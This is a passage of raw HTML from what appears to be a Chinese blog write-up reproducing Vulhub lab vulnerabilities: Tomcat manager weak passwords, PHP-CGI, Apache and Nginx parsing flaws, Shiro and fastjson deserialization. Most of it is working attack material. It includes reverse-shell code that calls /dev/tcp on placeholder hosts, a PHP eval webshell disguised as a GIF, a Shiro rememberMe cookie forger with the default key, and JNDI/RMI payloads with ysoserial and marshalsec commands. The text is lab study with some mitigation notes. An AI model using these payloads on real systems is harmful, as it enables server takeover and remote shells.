class="line">&lt;%</span><br><span class="line">    <span class="built_in">String</span>[] cmdstr = &#123; <span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1"</span> &#125;;</span><br><span class="line">    Runtime.getRuntime().exec(cmdstr);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½å¼¹shelläº†ã€‚</p><h2 id="tomcat7-å¼±å£ä»¤-amp-amp-åå°getshellæ¼æ´"><a href="#tomcat7-å¼±å£ä»¤-amp-amp-åå°getshellæ¼æ´" class="headerlink" title="tomcat7+ å¼±å£ä»¤ &amp;&amp; åå°getshellæ¼æ´"></a>tomcat7+ å¼±å£ä»¤ &amp;&amp; åå°getshellæ¼æ´</h2><p>å› ä¸ºWUSTé‚£é“é¢˜è¿‡æ¥å¤ç°äº†ä¸‹ã€‚è¿˜æƒŠäººçš„é‡ç°äº†ï¼šé‡å¤ä½¿ç”¨ä¸€ä¸ªä¸€æ¬¡æ€§çš„cookieä¹Ÿä¼šé€ æˆ403çš„é—®é¢˜ã€‚çœ‹æ¥é¢˜ç›®æœç„¶æºäºç”Ÿæ´»ã€‚</p><p>æ­¥éª¤å¾ˆç®€å•ã€‚ç¬¬ä¸€æ­¥tomcatå¼±å£ä»¤ç™»å…¥<code>manager/html</code>åå°<br>æ­£å¸¸å®‰è£…çš„æƒ…å†µä¸‹ï¼Œtomcat8ä¸­é»˜è®¤æ²¡æœ‰ä»»ä½•ç”¨æˆ·ï¼Œä¸”manageré¡µé¢åªå…è®¸æœ¬åœ°IPè®¿é—®ã€‚åªæœ‰ç®¡ç†å‘˜æ‰‹å·¥ä¿®æ”¹äº†è¿™äº›å±æ€§çš„æƒ…å†µä¸‹ï¼Œæ‰å¯ä»¥è¿›è¡Œæ”»å‡»ã€‚<br>ç”±äºåå°æ”¯æŒéƒ¨ç½²waræ–‡ä»¶ï¼Œç›´æ¥ä¸Šä¼ warå³å¯getshell<br>æ­¥éª¤:<br>1.cmd.jsp</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                 </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><code>jar cvf webshell.war webshell.jsp</code><br>ç”Ÿæˆwebshell<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/10.5.PNG" class="lazyload" data-srcset="10.5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>2.å‘½ä»¤æ‰§è¡Œ<br><code>/webshell/exp.jsp?pwd=023&amp;i=id)</code><br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h1 id="PHP-CGIè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2012-1823ï¼‰"><a href="#PHP-CGIè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2012-1823ï¼‰" class="headerlink" title="PHP-CGIè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2012-1823ï¼‰"></a>PHP-CGIè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2012-1823ï¼‰</h1><p>å‡ºç°åœ¨ä»¥cgiæ¨¡å¼è¿è¡Œçš„phpä¸­ï¼Œå½±å“ç‰ˆæœ¬ php &lt; 5.3.12 or php &lt; 5.4.2<br>ç®€å•è¯´å°±æ˜¯å‘½ä»¤è¡Œçš„å‚æ•°å¯ä»¥é€šè¿‡querysringçš„å½¢å¼ä¼ å…¥ã€‚<br>æ¯”å¦‚ç›´æ¥ä¼ -s<br><code>index.php?-s</code><br>ç›´æ¥å›æ˜¾æºç ã€‚<br>è¿›ä¸€æ­¥åˆ©ç”¨è¿™ç‚¹ï¼Œåˆ™é€šè¿‡-dä½¿ç”¨<code>php://input</code>è¾¾æˆæ–‡ä»¶åŒ…å«=&gt;å‘½ä»¤æ‰§è¡Œã€‚<br>payload<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/12.PNG" class="lazyload" data-srcset="12.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p><code>POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data: &lt;?php echo &#96;ls&#96;; ?&gt;</span><br></pre></td></tr></table></figure><h1 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h1><h2 id="Apache-HTTPD-å¤šåç¼€è§£ææ¼æ´"><a href="#Apache-HTTPD-å¤šåç¼€è§£ææ¼æ´" class="headerlink" title="Apache HTTPD å¤šåç¼€è§£ææ¼æ´"></a>Apache HTTPD å¤šåç¼€è§£ææ¼æ´</h2><p>Apache HTTPD æ”¯æŒä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªåç¼€<br>å‡å¦‚é…ç½®å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåœ¨æœ‰å¤šä¸ªåç¼€çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸€ä¸ªæ–‡ä»¶å«æœ‰.phpåç¼€çš„æ–‡ä»¶å³å°†è¢«è¯†åˆ«æˆPHPæ–‡ä»¶<br>æ‰€ä»¥å¯ä»¥ä½¿ç”¨ä¸Šä¼ æ—¶åŠ åç¼€ç»•è¿‡</p><p>è®¿é—®ä¸Šä¼ 1.php.jpgå³å¯å‘ç°å…¶è¢«è§£æä¸ºphp<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/13.PNG" class="lazyload" data-srcset="13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="Apache-SSI-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#Apache-SSI-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</h2><p>ä¹‹å‰æ¥è§¦è¿‡çš„shtml çš„å‘½ä»¤æ‰§è¡Œ<br><code>&lt;!--#exec cmd=&quot;ls&quot; --&gt;</code></p><p>ä¹‹å‰HITCON2018 WhySoSerialä¸­ä¹Ÿæœ‰ç”¨åˆ°å®ƒè¿›è¡Œæ–‡ä»¶åŒ…å«çš„åˆ©ç”¨,è¿™ä¹Ÿæ˜¯shtmlçš„Server-Side Includeså³ssiçš„ç‰¹æ€§äº†ã€‚</p><h2 id="Apache-HTTPD-æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰"><a href="#Apache-HTTPD-æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰" class="headerlink" title="Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰"></a>Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰</h2><p>ç¯å¢ƒæœ‰é—®é¢˜â€¦æ²¡æ³•å¤ç°äº†<br>å¤§æ¦‚å°±æ˜¯ä¸Šä¼ phpè¢«banæ—¶,é€šè¿‡.php%0aç»•è¿‡ï¼Œä½†æ˜¯è®¿é—®æ–‡ä»¶æ—¶æ—¶ä»èƒ½è¢«è§£ææˆphp</p><h1 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h1><h2 id="Nginx-è§£ææ¼æ´å¤ç°"><a href="#Nginx-è§£ææ¼æ´å¤ç°" class="headerlink" title="Nginx è§£ææ¼æ´å¤ç°"></a>Nginx è§£ææ¼æ´å¤ç°</h2><p>è¿™ä¸ªæ´ç›´æ¥å¸®æˆ‘è§£å†³æŸå…¥ç¾¤é¢˜å›°æ‰°äº†å¥½ä¹…çš„ä¸€ä¸ªç‚¹ã€‚ä¹Ÿè§£å†³äº†æˆ‘åŸæ¥åœ¨åšæœ‰å…³nginxæœ‰å…³æœåŠ¡çš„é¢˜ç›®æ—¶é‡åˆ°çš„å¥‡ç‰¹ç°è±¡ã€‚<br>è¯¥æ¼æ´ä¸Nginxã€phpç‰ˆæœ¬æ— å…³ï¼Œå±äºç”¨æˆ·é…ç½®ä¸å½“é€ æˆçš„è§£ææ¼æ´</p><p>è¿›å…¥ç¯å¢ƒã€‚ç›´æ¥ä¸Šä¼ ä¸€ä¸ª<code>GIF89A&lt;?php @eval($_POST[0]);?&gt;</code>çš„1.jpg<br>ç»•è¿‡æ£€æµ‹ï¼Œä¸Šä¼ å›¾ç‰‡ã€‚</p><p>åŒæ—¶è®¿é—®å›¾ç‰‡ã€‚<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/14.PNG" class="lazyload" data-srcset="14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä½†æ˜¯ä¸€æ—¦åœ¨jpgååŠ ä¸Š<code>/.php</code>è¿™ä¸ªé©¬å°±å°†è¢«ä½œä¸ºphpè§£æ<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/15.PNG" class="lazyload" data-srcset="15.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æˆåŠŸgetshell</p><p>å› æ­¤å¯ä»¥ç”¨åœ¨æŸäº›ç‰¹æ®Šçš„ä¸Šä¼ é¢˜ç›®ä¸­ã€‚å¾—åˆ°webshellç«Ÿå¯ä»¥å¦‚æ­¤ç®€å•,ä¹Ÿç®—æ˜¯ä¸€ä¸ªå°æŠ€å·§äº†ã€‚</p><p>è‡³äºåŸå› çš„è¯,è¿˜æ˜¯ç”±äºnginxçš„é…ç½®é—®é¢˜ã€‚<br>ä¸€æ—¦é…ç½®æˆæŠŠä»¥.phpç»“å°¾çš„æ–‡ä»¶äº¤ç»™fastcgiå¤„ç†,é‡åˆ°æˆ‘ä»¬çš„/.phpå°±ç›´æ¥æ‰”ç»™phpäº†ã€‚<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/16.PNG" class="lazyload" data-srcset="16.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¸”php.iniè®¾ç½®äº†cgi.fix_pathinfo=1æ—¶,fastcgiä¼šè‡ªåŠ¨æ‰¾åˆ°ä¸Šçº§çš„1.jpgå¤„ç†ã€‚<br>æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯php-fpm.confä¸­çš„security.limit_extensionsé…ç½®é¡¹é™åˆ¶äº†fastcgiè§£ææ–‡ä»¶çš„ç±»å‹<br>è¿™é¡¹ä¸ºç©ºæ—¶å°±ä¼šå°†jpgæ–‡ä»¶å½“åšä»£ç è§£æã€‚</p><p>æ‰€ä»¥åªè¦</p><blockquote><p>1ã€ å°†php.iniæ–‡ä»¶ä¸­çš„cgi.fix_pathinfoçš„å€¼è®¾ç½®ä¸º0,è¿™æ ·phpå†è§£æ1.php/1.jpgè¿™æ ·çš„ç›®å½•æ—¶,åªè¦1.jpgä¸å­˜åœ¨å°±ä¼šæ˜¾ç¤º404é¡µé¢<br>  2ã€ php-fpm.confä¸­çš„security.limit_extensionsåé¢çš„å€¼è®¾ç½®ä¸º.php </p></blockquote><p>å°±å¯ä»¥é˜²æ­¢é”™è¯¯è§£æã€‚</p><h2 id="Nginx-æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰"><a href="#Nginx-æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰" class="headerlink" title="Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰"></a>Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰</h2><p>è¿™ä¸ªè·Ÿä¸Šé¢çš„æŒºåƒçš„ï¼Œ<br>éæ³•å­—ç¬¦ç©ºæ ¼å’Œæˆªæ­¢ç¬¦ï¼ˆ\0ï¼‰ä¼šå¯¼è‡´Nginxè§£æURIæ—¶çš„æœ‰é™çŠ¶æ€æœºæ··ä¹±ï¼Œå±å®³æ˜¯å…è®¸æ”»å‡»è€…é€šè¿‡ä¸€ä¸ªéç¼–ç ç©ºæ ¼ç»•è¿‡åç¼€åé™åˆ¶ã€‚<br><code>http://127.0.0.1/file.aaa \0.php</code><br>ä¸ç”¨è¯´ä¹ŸçŸ¥é“webshellå§¿åŠ¿+1</p><p>è¿˜æœ‰å‡ ä¸ªé…ç½®æ¼æ´å°±ä¸å¤ç°äº†hhh</p><h1 id="Apache-Shiro-1-2-4ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰"><a href="#Apache-Shiro-1-2-4ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰" class="headerlink" title="Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰"></a>Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰</h1><p>ä¸¥æ ¼æ¥è¯´è‡ªå·±å¹¶æ²¡æœ‰ç”¨vulhubçš„é•œåƒå®Œæˆå¤ç°.æ‰€ä»¥è‡ªå·±æ‰¾äº†ç½‘ä¸Šå…¶ä»–çš„å¤ç°æ–‡ç« ï¼Œç”¨äº†ä¸‹medicean/vulapps:s_shiro_1è¿™ä¸ªé•œåƒ,å§‘ä¸”æ˜¯èƒ½åšäº†</p><p>Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸ºremember-meçš„Cookieä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨Shiroçš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ·Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><p>é¦–å…ˆå°±è¦å‡†å¤‡çš„æ˜¯javaååºåˆ—åŒ–çš„å·¥å…·ysoserial.è‡ªå·±ä¹‹å‰è¿˜åªç”¨è¿‡ysoserial.netã€‚æ²¡ç”¨è¿‡æœ¬å°Šè¿™ä¸ªjavaååºåˆ—åŒ–ç¥å™¨ã€‚å¯ä»¥ç›´æ¥å»githubé¡¹ç›®ä¸Šæ‰¾å·²ç»ç¼–è¯‘å¥½çš„jar.æˆ–è€…git cloneæºç ç”¨mvnç¼–è¯‘ã€‚æš‚ä¸”ä¸æã€‚</p><p>ç„¶åé¦–å…ˆéœ€è¦æ„é€ gadget.æˆ‘çš„ç›®çš„æ˜¯åå¼¹shell.æ‰€ä»¥è¦æŠŠåå¼¹shellçš„ä»£ç å‡†å¤‡ä¸‹(æ³¨æ„ã€‚javaååºåˆ—è§¦å‘åå¼¹shellä¸€å®šä¸èƒ½ç›´æ¥ä¼ å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼Œä¹‹å‰ghostcaté‡Œä¹Ÿæè¿‡äº†,å¿…é¡»è¦å­—ç¬¦ä¸²æ•°ç»„,å¦åˆ™<code>&gt;</code>è¿™æ ·çš„å­—ç¬¦è¿‡ä¸å»)è€Œæ­¤å¤„æˆ‘ä»¬é€‰æ‹©base64 åŠ å·¥å‘½ä»¤æ‰§è¡Œä»£ç è§£å†³è¿™ä¸ªé—®é¢˜<br>å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªç½‘ç«™ç›´æ¥å¾—åˆ°ç¼–ç payload<br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a><br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/17.PNG" class="lazyload" data-srcset="17.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 <span class="string">'BASE64_ENCODED_COMMAND'</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èµ·äº†ä¸€ä¸ªJRMPæœåŠ¡ç›‘å¬6666ç«¯å£ã€‚å®ƒä¼šæ¥å—è¢«æ”»å‡»çš„æœåŠ¡å™¨<br>ä¿¡æ¯å¹¶ååºåˆ—åŒ–ï¼Œæ‰§è¡Œgadgetå¯¹åº”çš„å‘½ä»¤</p><p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ åºåˆ—åŒ–çš„cookie rememberMeäº†ã€‚é¦–å…ˆåœ¨ç™»å½•ç•Œé¢å‹¾é€‰remembermeå¹¶æŠ“åŒ…ï¼Œå‡†å¤‡æ›¿æ¢cookieä¸ºæˆ‘ä»¬çš„åˆ©ç”¨cookie</p><p>åˆ©ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬ç”Ÿæˆcookieï¼Œå‚æ•°ä¼ <code>æ”»å‡»ipï¼šjavaç›‘å¬ç«¯å£</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])   </span><br><span class="line"><span class="keyword">print</span> <span class="string">"rememberMe=&#123;0&#125;"</span>.format(payload.decode())</span><br></pre></td></tr></table></figure><p>æœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨äº†shiroé»˜è®¤å¯†é’¥è¿›è¡ŒAESåŠ å¯†ã€‚æ‰€ä»¥å¯è§ç¡¬ç¼–ç å¸¦æ¥çš„å±å®³ï¼Œå¯¼è‡´cookieå¯æ§å³å¯è§¦å‘ååºåˆ—åŒ–ã€‚<br>ç”Ÿæˆçš„cookieæ›¿æ¢å³å¯è§¦å‘ååºåˆ—åŒ–<br>ncç›‘å¬ç«¯å£å¾—åˆ°åå¼¹shell<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/18.PNG" class="lazyload" data-srcset="18.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/19.PNG" class="lazyload" data-srcset="19.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>vulhubçš„ç¯å¢ƒä¸çŸ¥é“ä¸ºä»€ä¹ˆå¼¹ä¸åˆ°shell,è€Œå®ƒç»™å‡ºçš„æ–¹æ³•gadgetä¹Ÿå®Œå…¨ä¸ä¸€æ ·,ä¸è¿‡æ€è·¯å¤§åŒå°å¼‚ã€‚å°±æ˜¯æˆ‘çš„eclipseåŠ è½½é¡¹ç›®åŠå¤©æ²¡æå¥½â€¦</p><h2 id="fastjson-1-2-24-ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#fastjson-1-2-24-ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="fastjson 1.2.24 ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>fastjson 1.2.24 ååºåˆ—åŒ–å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´</h2><p>æœ€è¿‘è«åæ„Ÿè§‰javaçš„é¢˜å¤šèµ·æ¥äº†ï¼Œåœ¨è§‚æ‘©å…¶ä»–dalaoä»¬çš„blogæ—¶ä¹Ÿå‘ç°ä¸å°‘å†…å®¹éƒ½åœ¨æ·±åº¦ç ”ç©¶javaçš„ç›¸å…³æ¼æ´ã€‚æ‰€ä»¥è‡ªå·±ä¹Ÿæ¥å°è¯•å¤šå¤ç°å‡ ä¸ªååºåˆ—åŒ–çš„æ´ã€‚è‡³å°‘å…ˆå½“ä¸ªè„šæœ¬å°å­,ç­‰åˆ°æš‘å‡å°±èƒ½å¥½å¥½ç ”ç©¶äº†ã€‚</p><p>é¦–å…ˆæ˜¯1.2.24çš„fastjson.è¿™é‡Œä¸»è¦æ˜¯ä¸€ä¸ªjndiæ³¨å…¥ã€‚å…¶åˆ©ç”¨æµç¨‹å¦‚ä¸‹ï¼š<br>é¦–å…ˆå‡†å¤‡å¥½åˆ©ç”¨çš„æºç exp.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123; <span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"bash -i &gt;&amp; /dev/tcp/xxxxxx/9001 0&gt;&amp;1"</span> &#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶å<code>javac exp.java</code>ç¼–è¯‘å¥½å¾—åˆ°exp.classã€‚</p><p>è€ŒæœåŠ¡ç«¯åœ¨<code>Content-Type:application/json</code>ä¸‹,post jsonæ•°æ®</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://xxx:9999/exp"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°äº†marshalsecè¿™ä¸ªå·¥å…·ã€‚åŸºæœ¬ä¸Šè·Ÿysoserialç”¨èµ·æ¥ä¸€æ ·çš„ã€‚æ‹·è´æºç mavenç¼–è¯‘å°±å¥½<br>æ¥ä¸‹æ¥å¯åŠ¨ä¸€ä¸ªRMIæœåŠ¡å™¨ï¼Œç›‘å¬9999ç«¯å£ï¼Œå¹¶åˆ¶å®šåŠ è½½è¿œç¨‹ç±»exp.class</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;xxx&#x2F;#exp&quot; 9999</span><br></pre></td></tr></table></figure><p>å®‰å…¨èµ·è§,æœ€å¥½è¿˜æ˜¯æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹æ”¾classæ–‡ä»¶å¹¶ç”¨pythonç›‘å¬80ç«¯å£.</p><p>æœ¬æœºç›‘å¬9001ç«¯å£æ”¶åˆ°shell.<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/20.PNG" 